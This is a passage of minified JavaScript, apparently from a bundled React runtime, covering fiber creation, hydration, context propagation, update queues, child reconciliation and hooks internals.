p===null?(p=Sa(u.tag,d,u.key,u.mode),p.elementType=u.elementType,p.type=u.type,p.stateNode=u.stateNode,p.alternate=u,u.alternate=p):(p.pendingProps=d,p.type=u.type,p.flags=0,p.subtreeFlags=0,p.deletions=null),p.flags=u.flags&65011712,p.childLanes=u.childLanes,p.lanes=u.lanes,p.child=u.child,p.memoizedProps=u.memoizedProps,p.memoizedState=u.memoizedState,p.updateQueue=u.updateQueue,d=u.dependencies,p.dependencies=d===null?null:{lanes:d.lanes,firstContext:d.firstContext},p.sibling=u.sibling,p.index=u.index,p.ref=u.ref,p.refCleanup=u.refCleanup,p}function MU(u,d){u.flags&=65011714;var p=u.alternate;return p===null?(u.childLanes=0,u.lanes=d,u.child=null,u.subtreeFlags=0,u.memoizedProps=null,u.memoizedState=null,u.updateQueue=null,u.dependencies=null,u.stateNode=null):(u.childLanes=p.childLanes,u.lanes=p.lanes,u.child=p.child,u.subtreeFlags=0,u.deletions=null,u.memoizedProps=p.memoizedProps,u.memoizedState=p.memoizedState,u.updateQueue=p.updateQueue,u.type=p.type,d=p.dependencies,u.dependencies=d===null?null:{lanes:d.lanes,firstContext:d.firstContext}),u}function T5(u,d,p,g,D,F){var K=0;if(g=u,typeof u=="function")kR(u)&&(K=1);else if(typeof u=="string")K=e0e(u,p,Z.current)?26:u==="html"||u==="head"||u==="body"?27:5;else e:switch(u){case T:return u=Sa(31,p,d,D),u.elementType=T,u.lanes=F,u;case y:return k0(p.children,D,F,d);case E:K=8,D|=24;break;case A:return u=Sa(12,p,d,D|2),u.elementType=A,u.lanes=F,u;case k:return u=Sa(13,p,d,D),u.elementType=k,u.lanes=F,u;case O:return u=Sa(19,p,d,D),u.elementType=O,u.lanes=F,u;default:if(typeof u=="object"&&u!==null)switch(u.$$typeof){case S:K=10;break e;case R:K=9;break e;case v:K=11;break e;case _:K=14;break e;case I:K=16,g=null;break e}K=29,p=Error(r(130,u===null?"null":typeof u,"")),g=null}return d=Sa(K,p,d,D),d.elementType=u,d.type=g,d.lanes=F,d}function k0(u,d,p,g){return u=Sa(7,u,g,d),u.lanes=p,u}function DR(u,d,p){return u=Sa(6,u,null,d),u.lanes=p,u}function UU(u){var d=Sa(18,null,null,0);return d.stateNode=u,d}function BR(u,d,p){return d=Sa(4,u.children!==null?u.children:[],u.key,d),d.lanes=p,d.stateNode={containerInfo:u.containerInfo,pendingChildren:null,implementation:u.implementation},d}var LU=new WeakMap;function hc(u,d){if(typeof u=="object"&&u!==null){var p=LU.get(u);return p!==void 0?p:(d={value:u,source:d,stack:At(d)},LU.set(u,d),d)}return{value:u,source:d,stack:At(d)}}var Py=[],Ny=0,x5=null,jw=0,pc=[],mc=0,ph=null,pl=1,ml="";function yd(u,d){Py[Ny++]=jw,Py[Ny++]=x5,x5=u,jw=d}function FU(u,d,p){pc[mc++]=pl,pc[mc++]=ml,pc[mc++]=ph,ph=u;var g=pl;u=ml;var D=32-br(g)-1;g&=~(1<<D),p+=1;var F=32-br(d)+D;if(30<F){var K=D-D%5;F=(g&(1<<K)-1).toString(32),g>>=K,D-=K,pl=1<<32-br(d)+D|p<<D|g,ml=F+u}else pl=1<<F|p<<D|g,ml=u}function jR(u){u.return!==null&&(yd(u,1),FU(u,1,0))}function MR(u){for(;u===x5;)x5=Py[--Ny],Py[Ny]=null,jw=Py[--Ny],Py[Ny]=null;for(;u===ph;)ph=pc[--mc],pc[mc]=null,ml=pc[--mc],pc[mc]=null,pl=pc[--mc],pc[mc]=null}function $U(u,d){pc[mc++]=pl,pc[mc++]=ml,pc[mc++]=ph,pl=d.id,ml=d.overflow,ph=u}var fs=null,Rr=null,gn=!1,mh=null,gc=!1,UR=Error(r(519));function gh(u){var d=Error(r(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Mw(hc(d,u)),UR}function HU(u){var d=u.stateNode,p=u.type,g=u.memoizedProps;switch(d[Ir]=u,d[Jr]=g,p){case"dialog":dn("cancel",d),dn("close",d);break;case"iframe":case"object":case"embed":dn("load",d);break;case"video":case"audio":for(p=0;p<sv.length;p++)dn(sv[p],d);break;case"source":dn("error",d);break;case"img":case"image":case"link":dn("error",d),dn("load",d);break;case"details":dn("toggle",d);break;case"input":dn("invalid",d),yy(d,g.value,g.defaultValue,g.checked,g.defaultChecked,g.type,g.name,!0);break;case"select":dn("invalid",d);break;case"textarea":dn("invalid",d),iu(d,g.value,g.defaultValue,g.children)}p=g.children,typeof p!="string"&&typeof p!="number"&&typeof p!="bigint"||d.textContent===""+p||g.suppressHydrationWarning===!0||s$(d.textContent,p)?(g.popover!=null&&(dn("beforetoggle",d),dn("toggle",d)),g.onScroll!=null&&dn("scroll",d),g.onScrollEnd!=null&&dn("scrollend",d),g.onClick!=null&&(d.onclick=_a),d=!0):d=!1,d||gh(u,!0)}function zU(u){for(fs=u.return;fs;)switch(fs.tag){case 5:case 31:case 13:gc=!1;return;case 27:case 3:gc=!0;return;default:fs=fs.return}}function Oy(u){if(u!==fs)return!1;if(!gn)return zU(u),gn=!0,!1;var d=u.tag,p;if((p=d!==3&&d!==27)&&((p=d===5)&&(p=u.type,p=!(p!=="form"&&p!=="button")||nN(u.type,u.memoizedProps)),p=!p),p&&Rr&&gh(u),zU(u),d===13){if(u=u.memoizedState,u=u!==null?u.dehydrated:null,!u)throw Error(r(317));Rr=p$(u)}else if(d===31){if(u=u.memoizedState,u=u!==null?u.dehydrated:null,!u)throw Error(r(317));Rr=p$(u)}else d===27?(d=Rr,Ph(u.type)?(u=aN,aN=null,Rr=u):Rr=d):Rr=fs?bc(u.stateNode.nextSibling):null;return!0}function D0(){Rr=fs=null,gn=!1}function LR(){var u=mh;return u!==null&&(Mo===null?Mo=u:Mo.push.apply(Mo,u),mh=null),u}function Mw(u){mh===null?mh=[u]:mh.push(u)}var FR=L(null),B0=null,bd=null;function yh(u,d,p){G(FR,d._currentValue),d._currentValue=p}function wd(u){u._currentValue=FR.current,V(FR)}function $R(u,d,p){for(;u!==null;){var g=u.alternate;if((u.childLanes&d)!==d?(u.childLanes|=d,g!==null&&(g.childLanes|=d)):g!==null&&(g.childLanes&d)!==d&&(g.childLanes|=d),u===p)break;u=u.return}}function HR(u,d,p,g){var D=u.child;for(D!==null&&(D.return=u);D!==null;){var F=D.dependencies;if(F!==null){var K=D.child;F=F.firstContext;e:for(;F!==null;){var te=F;F=D;for(var ce=0;ce<d.length;ce++)if(te.context===d[ce]){F.lanes|=p,te=F.alternate,te!==null&&(te.lanes|=p),$R(F.return,p,u),g||(K=null);break e}F=te.next}}else if(D.tag===18){if(K=D.return,K===null)throw Error(r(341));K.lanes|=p,F=K.alternate,F!==null&&(F.lanes|=p),$R(K,p,u),K=null}else K=D.child;if(K!==null)K.return=D;else for(K=D;K!==null;){if(K===u){K=null;break}if(D=K.sibling,D!==null){D.return=K.return,K=D;break}K=K.return}D=K}}function ky(u,d,p,g){u=null;for(var D=d,F=!1;D!==null;){if(!F){if((D.flags&524288)!==0)F=!0;else if((D.flags&262144)!==0)break}if(D.tag===10){var K=D.alternate;if(K===null)throw Error(r(387));if(K=K.memoizedProps,K!==null){var te=D.type;Ca(D.pendingProps.value,K.value)||(u!==null?u.push(te):u=[te])}}else if(D===re.current){if(K=D.alternate,K===null)throw Error(r(387));K.memoizedState.memoizedState!==D.memoizedState.memoizedState&&(u!==null?u.push(lv):u=[lv])}D=D.return}u!==null&&HR(d,u,p,g),d.flags|=262144}function I5(u){for(u=u.firstContext;u!==null;){if(!Ca(u.context._currentValue,u.memoizedValue))return!0;u=u.next}return!1}function j0(u){B0=u,bd=null,u=u.dependencies,u!==null&&(u.firstContext=null)}function hs(u){return qU(B0,u)}function R5(u,d){return B0===null&&j0(u),qU(u,d)}function qU(u,d){var p=d._currentValue;if(d={context:d,memoizedValue:p,next:null},bd===null){if(u===null)throw Error(r(308));bd=d,u.dependencies={lanes:0,firstContext:d},u.flags|=524288}else bd=bd.next=d;return p}var Yhe=typeof AbortController<"u"?AbortController:function(){var u=[],d=this.signal={aborted:!1,addEventListener:function(p,g){u.push(g)}};this.abort=function(){d.aborted=!0,u.forEach(function(p){return p()})}},Qhe=t.unstable_scheduleCallback,Jhe=t.unstable_NormalPriority,_i={$$typeof:S,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function zR(){return{controller:new Yhe,data:new Map,refCount:0}}function Uw(u){u.refCount--,u.refCount===0&&Qhe(Jhe,function(){u.controller.abort()})}var Lw=null,qR=0,Dy=0,By=null;function Xhe(u,d){if(Lw===null){var p=Lw=[];qR=0,Dy=GP(),By={status:"pending",value:void 0,then:function(g){p.push(g)}}}return qR++,d.then(VU,VU),d}function VU(){if(--qR===0&&Lw!==null){By!==null&&(By.status="fulfilled");var u=Lw;Lw=null,Dy=0,By=null;for(var d=0;d<u.length;d++)(0,u[d])()}}function epe(u,d){var p=[],g={status:"pending",value:null,reason:null,then:function(D){p.push(D)}};return u.then(function(){g.status="fulfilled",g.value=d;for(var D=0;D<p.length;D++)(0,p[D])(d)},function(D){for(g.status="rejected",g.reason=D,D=0;D<p.length;D++)(0,p[D])(void 0)}),g}var WU=C.S;C.S=function(u,d){RF=Nn(),typeof d=="object"&&d!==null&&typeof d.then=="function"&&Xhe(u,d),WU!==null&&WU(u,d)};var M0=L(null);function VR(){var u=M0.current;return u!==null?u:ur.pooledCache}function P5(u,d){d===null?G(M0,M0.current):G(M0,d.pool)}function GU(){var u=VR();return u===null?null:{parent:_i._currentValue,pool:u}}var jy=Error(r(460)),WR=Error(r(474)),N5=Error(r(542)),O5={then:function(){}};function KU(u){return u=u.status,u==="fulfilled"||u==="rejected"}function ZU(u,d,p){switch(p=u[p],p===void 0?u.push(d):p!==d&&(d.then(_a,_a),d=p),d.status){case"fulfilled":return d.value;case"rejected":throw u=d.reason,QU(u),u;default:if(typeof d.status=="string")d.then(_a,_a);else{if(u=ur,u!==null&&100<u.shellSuspendCounter)throw Error(r(482));u=d,u.status="pending",u.then(function(g){if(d.status==="pending"){var D=d;D.status="fulfilled",D.value=g}},function(g){if(d.status==="pending"){var D=d;D.status="rejected",D.reason=g}})}switch(d.status){case"fulfilled":return d.value;case"rejected":throw u=d.reason,QU(u),u}throw L0=d,jy}}function U0(u){try{var d=u._init;return d(u._payload)}catch(p){throw p!==null&&typeof p=="object"&&typeof p.then=="function"?(L0=p,jy):p}}var L0=null;function YU(){if(L0===null)throw Error(r(459));var u=L0;return L0=null,u}function QU(u){if(u===jy||u===N5)throw Error(r(483))}var My=null,Fw=0;function k5(u){var d=Fw;return Fw+=1,My===null&&(My=[]),ZU(My,u,d)}function $w(u,d){d=d.props.ref,u.ref=d!==void 0?d:null}function D5(u,d){throw d.$$typeof===m?Error(r(525)):(u=Object.prototype.toString.call(d),Error(r(31,u==="[object Object]"?"object with keys {"+Object.keys(d).join(", ")+"}":u)))}function JU(u){function d(ye,fe){if(u){var _e=ye.deletions;_e===null?(ye.deletions=[fe],ye.flags|=16):_e.push(fe)}}function p(ye,fe){if(!u)return null;for(;fe!==null;)d(ye,fe),fe=fe.sibling;return null}function g(ye){for(var fe=new Map;ye!==null;)ye.key!==null?fe.set(ye.key,ye):fe.set(ye.index,ye),ye=ye.sibling;return fe}function D(ye,fe){return ye=gd(ye,fe),ye.index=0,ye.sibling=null,ye}function F(ye,fe,_e){return ye.index=_e,u?(_e=ye.alternate,_e!==null?(_e=_e.index,_e<fe?(ye.flags|=67108866,fe):_e):(ye.flags|=67108866,fe)):(ye.flags|=1048576,fe)}function K(ye){return u&&ye.alternate===null&&(ye.flags|=67108866),ye}function te(ye,fe,_e,je){return fe===null||fe.tag!==6?(fe=DR(_e,ye.mode,je),fe.return=ye,fe):(fe=D(fe,_e),fe.return=ye,fe)}function ce(ye,fe,_e,je){var It=_e.type;return It===y?De(ye,fe,_e.props.children,je,_e.key):fe!==null&&(fe.elementType===It||typeof It=="object"&&It!==null&&It.$$typeof===I&&U0(It)===fe.type)?(fe=D(fe,_e.props),$w(fe,_e),fe.return=ye,fe):(fe=T5(_e.type,_e.key,_e.props,null,ye.mode,je),$w(fe,_e),fe.return=ye,fe)}function Ae(ye,fe,_e,je){return fe===null||fe.tag!==4||fe.stateNode.containerInfo!==_e.containerInfo||fe.stateNode.implementation!==_e.implementation?(fe=BR(_e,ye.mode,je),fe.return=ye,fe):(fe=D(fe,_e.children||[]),fe.return=ye,fe)}function De(ye,fe,_e,je,It){return fe===null||fe.tag!==7?(fe=k0(_e,ye.mode,je,It),fe.return=ye,fe):(fe=D(fe,_e),fe.return=ye,fe)}function Le(ye,fe,_e){if(typeof fe=="string"&&fe!==""||typeof fe=="number"||typeof fe=="bigint")return fe=DR(""+fe,ye.mode,_e),fe.return=ye,fe;if(typeof fe=="object"&&fe!==null){switch(fe.$$typeof){case b:return _e=T5(fe.type,fe.key,fe.props,null,ye.mode,_e),$w(_e,fe),_e.return=ye,_e;case w:return fe=BR(fe,ye.mode,_e),fe.return=ye,fe;case I:return fe=U0(fe),Le(ye,fe,_e)}if(P(fe)||M(fe))return fe=k0(fe,ye.mode,_e,null),fe.return=ye,fe;if(typeof fe.then=="function")return Le(ye,k5(fe),_e);if(fe.$$typeof===S)return Le(ye,R5(ye,fe),_e);D5(ye,fe)}return null}function Se(ye,fe,_e,je){var It=fe!==null?fe.key:null;if(typeof _e=="string"&&_e!==""||typeof _e=="number"||typeof _e=="bigint")return It!==null?null:te(ye,fe,""+_e,je);if(typeof _e=="object"&&_e!==null){switch(_e.$$typeof){case b:return _e.key===It?ce(ye,fe,_e,je):null;case w:return _e.key===It?Ae(ye,fe,_e,je):null;case I:return _e=U0(_e),Se(ye,fe,_e,je)}if(P(_e)||M(_e))return It!==null?null:De(ye,fe,_e,je,null);if(typeof _e.then=="function")return Se(ye,fe,k5(_e),je);if(_e.$$typeof===S)return Se(ye,fe,R5(ye,_e),je);D5(ye,_e)}return null}function Pe(ye,fe,_e,je,It){if(typeof je=="string"&&je!==""||typeof je=="number"||typeof je=="bigint")return ye=ye.get(_e)||null,te(fe,ye,""+je,It);if(typeof je=="object"&&je!==null){switch(je.$$typeof){case b:return ye=ye.get(je.key===null?_e:je.key)||null,ce(fe,ye,je,It);case w:return ye=ye.get(je.key===null?_e:je.key)||null,Ae(fe,ye,je,It);case I:return je=U0(je),Pe(ye,fe,_e,je,It)}if(P(je)||M(je))return ye=ye.get(_e)||null,De(fe,ye,je,It,null);if(typeof je.then=="function")return Pe(ye,fe,_e,k5(je),It);if(je.$$typeof===S)return Pe(ye,fe,_e,R5(fe,je),It);D5(fe,je)}return null}function vt(ye,fe,_e,je){for(var It=null,On=null,Ct=fe,Xt=fe=0,hn=null;Ct!==null&&Xt<_e.length;Xt++){Ct.index>Xt?(hn=Ct,Ct=null):hn=Ct.sibling;var kn=Se(ye,Ct,_e[Xt],je);if(kn===null){Ct===null&&(Ct=hn);break}u&&Ct&&kn.alternate===null&&d(ye,Ct),fe=F(kn,fe,Xt),On===null?It=kn:On.sibling=kn,On=kn,Ct=hn}if(Xt===_e.length)return p(ye,Ct),gn&&yd(ye,Xt),It;if(Ct===null){for(;Xt<_e.length;Xt++)Ct=Le(ye,_e[Xt],je),Ct!==null&&(fe=F(Ct,fe,Xt),On===null?It=Ct:On.sibling=Ct,On=Ct);return gn&&yd(ye,Xt),It}for(Ct=g(Ct);Xt<_e.length;Xt++)hn=Pe(Ct,ye,Xt,_e[Xt],je),hn!==null&&(u&&hn.alternate!==null&&Ct.delete(hn.key===null?Xt:hn.key),fe=F(hn,fe,Xt),On===null?It=hn:On.sibling=hn,On=hn);return u&&Ct.forEach(function(Bh){return d(ye,Bh)}),gn&&yd(ye,Xt),It}function Ut(ye,fe,_e,je){if(_e==null)throw Error(r(151));for(var It=null,On=null,Ct=fe,Xt=fe=0,hn=null,kn=_e.next();Ct!==null&&!kn.done;Xt++,kn=_e.next()){Ct.index>Xt?(hn=Ct,Ct=null):hn=Ct.sibling;var Bh=Se(ye,Ct,kn.value,je);if(Bh===null){Ct===null&&(Ct=hn);break}u&&Ct&&Bh.alternate===null&&d(ye,Ct),fe=F(Bh,fe,Xt),On===null?It=Bh:On.sibling=Bh,On=Bh,Ct=hn}if(kn.done)return p(ye,Ct),gn&&yd(ye,Xt),It;if(Ct===null){for(;!kn.done;Xt++,kn=_e.next())kn=Le(ye,kn.value,je),kn!==null&&(fe=F(kn,fe,Xt),On===null?It=kn:On.sibling=kn,On=kn);return gn&&yd(ye,Xt),It}for(Ct=g(Ct);!kn.done;Xt++,kn=_e.next())kn=Pe(Ct,ye,Xt,kn.value,je),kn!==null&&(u&&kn.alternate!==null&&Ct.delete(kn.key===null?Xt:kn.key),fe=F(kn,fe,Xt),On===null?It=kn:On.sibling=kn,On=kn);return u&&Ct.forEach(function(d0e){return d(ye,d0e)}),gn&&yd(ye,Xt),It}function sr(ye,fe,_e,je){if(typeof _e=="object"&&_e!==null&&_e.type===y&&_e.key===null&&(_e=_e.props.children),typeof _e=="object"&&_e!==null){switch(_e.$$typeof){case b:e:{for(var It=_e.key;fe!==null;){if(fe.key===It){if(It=_e.type,It===y){if(fe.tag===7){p(ye,fe.sibling),je=D(fe,_e.props.children),je.return=ye,ye=je;break e}}else if(fe.elementType===It||typeof It=="object"&&It!==null&&It.$$typeof===I&&U0(It)===fe.type){p(ye,fe.sibling),je=D(fe,_e.props),$w(je,_e),je.return=ye,ye=je;break e}p(ye,fe);break}else d(ye,fe);fe=fe.sibling}_e.type===y?(je=k0(_e.props.children,ye.mode,je,_e.key),je.return=ye,ye=je):(je=T5(_e.type,_e.key,_e.props,null,ye.mode,je),$w(je,_e),je.return=ye,ye=je)}return K(ye);case w:e:{for(It=_e.key;fe!==null;){if(fe.key===It)if(fe.tag===4&&fe.stateNode.containerInfo===_e.containerInfo&&fe.stateNode.implementation===_e.implementation){p(ye,fe.sibling),je=D(fe,_e.children||[]),je.return=ye,ye=je;break e}else{p(ye,fe);break}else d(ye,fe);fe=fe.sibling}je=BR(_e,ye.mode,je),je.return=ye,ye=je}return K(ye);case I:return _e=U0(_e),sr(ye,fe,_e,je)}if(P(_e))return vt(ye,fe,_e,je);if(M(_e)){if(It=M(_e),typeof It!="function")throw Error(r(150));return _e=It.call(_e),Ut(ye,fe,_e,je)}if(typeof _e.then=="function")return sr(ye,fe,k5(_e),je);if(_e.$$typeof===S)return sr(ye,fe,R5(ye,_e),je);D5(ye,_e)}return typeof _e=="string"&&_e!==""||typeof _e=="number"||typeof _e=="bigint"?(_e=""+_e,fe!==null&&fe.tag===6?(p(ye,fe.sibling),je=D(fe,_e),je.return=ye,ye=je):(p(ye,fe),je=DR(_e,ye.mode,je),je.return=ye,ye=je),K(ye)):p(ye,fe)}return function(ye,fe,_e,je){try{Fw=0;var It=sr(ye,fe,_e,je);return My=null,It}catch(Ct){if(Ct===jy||Ct===N5)throw Ct;var On=Sa(29,Ct,null,ye.mode);return On.lanes=je,On.return=ye,On}finally{}}}var F0=JU(!0),XU=JU(!1),bh=!1;function GR(u){u.updateQueue={baseState:u.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function KR(u,d){u=u.updateQueue,d.updateQueue===u&&(d.updateQueue={baseState:u.baseState,firstBaseUpdate:u.firstBaseUpdate,lastBaseUpdate:u.lastBaseUpdate,shared:u.shared,callbacks:null})}function wh(u){return{lane:u,tag:0,payload:null,callback:null,next:null}}function vh(u,d,p){var g=u.updateQueue;if(g===null)return null;if(g=g.shared,(Hn&2)!==0){var D=g.pending;return D===null?d.next=d:(d.next=D.next,D.next=d),g.pending=d,d=S5(u),jU(u,null,p),d}return C5(u,g,d,p),S5(u)}function Hw(u,d,p){if(d=d.updateQueue,d!==null&&(d=d.shared,(p&4194048)!==0)){var g=d.lanes;g&=u.pendingLanes,p|=g,d.lanes=p,ya(u,p)}}function ZR(u,d){var p=u.updateQueue,g=u.alternate;if(g!==null&&(g=g.updateQueue,p===g)){var D=null,F=null;if(p=p.firstBaseUpdate,p!==null){do{var K={lane:p.lane,tag:p.tag,payload:p.payload,callback:null,next:null};F===null?D=F=K:F=F.next=K,p=p.next}while(p!==null);F===null?D=F=d:F=F.next=d}else D=F=d;p={baseState:g.baseState,firstBaseUpdate:D,lastBaseUpdate:F,shared:g.shared,callbacks:g.callbacks},u.updateQueue=p;return}u=p.lastBaseUpdate,u===null?p.firstBaseUpdate=d:u.next=d,p.lastBaseUpdate=d}var YR=!1;function zw(){if(YR){var u=By;if(u!==null)throw u}}function qw(u,d,p,g){YR=!1;var D=u.updateQueue;bh=!1;var F=D.firstBaseUpdate,K=D.lastBaseUpdate,te=D.shared.pending;if(te!==null){D.shared.pending=null;var ce=te,Ae=ce.next;ce.next=null,K===null?F=Ae:K.next=Ae,K=ce;var De=u.alternate;De!==null&&(De=De.updateQueue,te=De.lastBaseUpdate,te!==K&&(te===null?De.firstBaseUpdate=Ae:te.next=Ae,De.lastBaseUpdate=ce))}if(F!==null){var Le=D.baseState;K=0,De=Ae=ce=null,te=F;do{var Se=te.lane&-536870913,Pe=Se!==te.lane;if(Pe?(fn&Se)===Se:(g&Se)===Se){Se!==0&&Se===Dy&&(YR=!0),De!==null&&(De=De.next={lane:0,tag:te.tag,payload:te.payload,callback:null,next:null});e:{var vt=u,Ut=te;Se=d;var sr=p;switch(Ut.tag){case 1:if(vt=Ut.payload,typeof vt=="function"){Le=vt.call(sr,Le,Se);break e}Le=vt;break e;case 3:vt.flags=vt.flags&-65537|128;case 0:if(vt=Ut.payload,Se=typeof vt=="function"?vt.call(sr,Le,Se):vt,Se==null)break e;Le=h({},Le,Se);break e;case 2:bh=!0}}Se=te.callback,Se!==null&&(u.flags|=64,Pe&&(u.flags|=8192),Pe=D.callbacks,Pe===null?D.callbacks=[Se]:Pe.push(Se))}else Pe={lane:Se,tag:te.tag,payload:te.payload,callback:te.callback,next:null},De===null?(Ae=De=Pe,ce=Le):De=De.next=Pe,K|=Se;if(te=te.next,te===null){if(te=D.shared.pending,te===null)break;Pe=te,te=Pe.next,Pe.next=null,D.lastBaseUpdate=Pe,D.shared.pending=null}}while(!0);De===null&&(ce=Le),D.baseState=ce,D.firstBaseUpdate=Ae,D.lastBaseUpdate=De,F===null&&(D.shared.lanes=0),Sh|=K,u.lanes=K,u.memoizedState=Le}}function eL(u,d){if(typeof u!="function")throw Error(r(191,u));u.call(d)}function tL(u,d){var p=u.callbacks;if(p!==null)for(u.callbacks=null,u=0;u<p.length;u++)eL(p[u],d)}var Uy=L(null),B5=L(0);function nL(u,d){u=Id,G(B5,u),G(Uy,d),Id=u|d.baseLanes}function QR(){G(B5,Id),G(Uy,Uy.current)}function JR(){Id=B5.current,V(Uy),V(B5)}var Ta=L(null),yc=null;function Eh(u){var d=u.alternate;G(di,di.current&1),G(Ta,u),yc===null&&(d===null||Uy.current!==null||d.memoizedState!==null)&&(yc=u)}function XR(u){G(di,di.current),G(Ta,u),yc===null&&(yc=u)}function rL(u){u.tag===22?(G(di,di.current),G(Ta,u),yc===null&&(yc=u)):_h()}function _h(){G(di,di.current),G(Ta,Ta.current)}function xa(u){V(Ta),yc===u&&(yc=null),V(di)}var di=L(0);function j5(u){for(var d=u;d!==null;){if(d.tag===13){var p=d.memoizedState;if(p!==null&&(p=p.dehydrated,p===null||sN(p)||oN(p)))return d}else if(d.tag===19&&(d.memoizedProps.revealOrder==="forwards"||d.memoizedProps.revealOrder==="backwards"||d.memoizedProps.revealOrder==="unstable_legacy-backwards"||d.memoizedProps.revealOrder==="together")){if((d.flags&128)!==0)return d}else if(d.child!==null){d.child.return=d,d=d.child;continue}if(d===u)break;for(;d.sibling===null;){if(d.return===null||d.return===u)return null;d=d.return}d.sibling.return=d.return,d=d.sibling}return null}var vd=0,Yt=null,rr=null,Ai=null,M5=!1,Ly=!1,$0=!1,U5=0,Vw=0,Fy=null,tpe=0;function ei(){throw Error(r(321))}function eP(u,d){if(d===null)return!1;for(var p=0;p<d.length&&p<u.length;p++)if(!Ca(u[p],d[p]))return!1;return!0}function tP(u,d,p,g,D,F){return vd=F,Yt=d,d.memoizedState=null,d.updateQueue=null,d.lanes=0,C.H=u===null||u.memoizedState===null?FL:gP,$0=!1,F=p(g,D),$0=!1,Ly&&(F=sL(d,p,g,D)),iL(u),F}function iL(u){C.H=Kw;var d=rr!==null&&rr.next!==null;if(vd=0,Ai=rr=Yt=null,M5=!1,Vw=0,Fy=null,d)throw Error(r(300));u===null||Ci||(u=u.dependencies,u!==null&&I5(u)&&(Ci=!0))}function sL(u,d,p,g){Yt=u;var D=0;do{if(Ly&&(Fy=null),Vw=0,Ly=!1,25<=D)throw Error(r(301));if(D+=1,Ai=rr=null,u.updateQueue!=null){var F=u.updateQueue;F.lastEffect=null,F.events=null,F.stores=null,F.memoCache!=null&&(F.memoCache.index=0)}C.H=$L,F=d(p,g)}while(Ly);return F}function npe(){var u=C.H,d=u.useState()[0];return d=typeof d.then=="function"?Ww(d):d,u=u.useState()[0],(rr!==null?rr.memoizedState:null)!==u&&(Yt.flags|=1024),d}function nP(){var u=U5!==0;return U5=0,u}function rP(u,d,p){d.updateQueue=u.updateQueue,d.flags&=-2053,u.lanes&=~p}function iP(u){if(M5){for(u=u.memoizedState;u!==null;){var d=u.queue;d!==null&&(d.pending=null),u=u.next}M5=!1}vd=0,Ai=rr=Yt=null,Ly=!1,Vw=U5=0,Fy=null}function io(){var u={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ai===null?Yt.memoizedState=Ai=u:Ai=Ai.next=u,Ai}function fi(){if(rr===null){var u=Yt.alternate;u=u!==null?u.memoizedState:null}else u=rr.next;var d=Ai===null?Yt.memoizedState:Ai.next;if(d!==null)Ai=d,rr=u;else{if(u===null)throw Yt.alternate===null?Error(r(467)):Error(r(310));rr=u,u={memoizedState:rr.memoizedState,baseState:rr.baseState,baseQueue:rr.baseQueue,queue:rr.queue,next:null},Ai===null?Yt.memoizedState=Ai=u:Ai=Ai.next=u}return Ai}function L5(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Ww(u){var d=Vw;return Vw+=1,Fy===null&&(Fy=[]),u=ZU(Fy,u,d),d=Yt,(Ai===null?d.memoizedState:Ai.next)===null&&(d=d.alternate,C.H=d===null||d.memoizedState===null?FL:gP),u}function F5(u){if(u!==null&&typeof u=="object"){if(typeof u.then=="function")return Ww(u);if(u.$$typeof===S)return hs(u)}throw Error(r(438,String(u)))}function sP(u){var d=null,p=Yt.updateQueue;if(p!==null&&(d=p.memoCache),d==null){var g=Yt.alternate;g!==null&&(g=g.updateQueue,g!==null&&(g=g.memoCache,g!=null&&(d={data:g.data.map(function(D){return D.slice()}),index:0})))}if(d==null&&(d={data:[],index:0}),p===null&&(p=L5(),Yt.updateQueue=p),p.memoCache=d,p=d.data[d.index],p===void 0)for(p=d.data[d.index]=Array(u),g=0;g<u;g++)p[g]=B;return d.index++,p}function Ed(u,d){return typeof d=="function"?d(u):d}function $5(u){var d=fi();return oP(d,rr,u)}function oP(u,d,p){var g=u.queue;if(g===null)throw Error(r(311));g.lastRenderedReducer=p;var D=u.baseQueue,F=g.pending;if(F!==null){if(D!==null){var K=D.next;D.next=F.next,F.next=K}d.baseQueue=D=F,g.pending=null}if(F=u.baseState,D===null)u.memoizedState=F;else{d=D.next;var te=K=null,ce=null,Ae=d,De=!1;do{var Le=Ae.lane&-536870913;if(Le!==Ae.lane?(fn&Le)===Le:(vd&Le)===Le){var Se=Ae.revertLane;if(Se===0)ce!==null&&(ce=ce.next={lane:0,revertLane:0,gesture:null,action:Ae.action,hasEagerState:Ae.hasEagerState,eagerState:Ae.eagerState,next:null}),Le===Dy&&(De=!0);else if((vd&Se)===Se){Ae=Ae.next,Se===Dy&&(De=!0);continue}else Le={lane:0,revertLane:Ae.revertLane,gesture:null,action:Ae.action,hasEagerState:Ae.hasEagerState,eagerState:Ae.eagerState,next:null},ce===null?(te=ce=Le,K=F):ce=ce.next=Le,Yt.lanes|=Se,Sh|=Se;Le=Ae.action,$0&&p(F,Le),F=Ae.hasEagerState?Ae.eagerState:p(F,Le)}else Se={lane:Le,revertLane:Ae.revertLane,gesture:Ae.gesture,action:Ae.action,hasEagerState:Ae.hasEagerState,eagerState:Ae.eagerState,next:null},ce===null?(te=ce=Se,K=F):ce=ce.next=Se,Yt.lanes|=Le,Sh|=Le;Ae=Ae.next}while(Ae!==null&&Ae!==d);if(ce===null?K=F:ce.next=te,!Ca(F,u.memoizedState)&&(Ci=!0,De&&(p=By,p!==null)))throw p;u.memoizedState=F,u.baseState=K,u.baseQueue=ce,g.lastRenderedState=F}return D===null&&(g.lanes=0),[u.memoizedState,g.dispatch]}function aP(u){var d=fi(),p=d.queue;if(p===null)throw Error(r(311));p.lastRenderedReducer=u;var g=p.dispatch,D=p.pending,F=d.memoizedState;if(D!==null){p.pending=null;var K=D=D.next;do F=u(F,K.action),K=K.next;while(K!==D);Ca(F,d.memoizedState)||(Ci=!0),d.memoizedState=F,d.baseQueue===null&&(d.baseState=F),p.lastRenderedState=F}return[F,g]}function oL(u,d,p){var g=Yt,D=fi(),F=gn;if(F){if(p===void 0)throw Error(r(407));p=p()}else p=d();var K=!Ca((rr||D).memoizedState,p);if(K&&(D.memoizedState=p,Ci=!0),D=D.queue,lP(uL.bind(null,g,D,u),[u]),D.getSnapshot!==d||K||Ai!==null&&Ai.memoizedState.tag&1){if(g.flags|=2048,$y(9,{destroy:void 0},cL.bind(null,g,D,p,d),null),ur===null)throw Error(r(349));F||(vd&127)!==0||aL(g,d,p)}return p}function 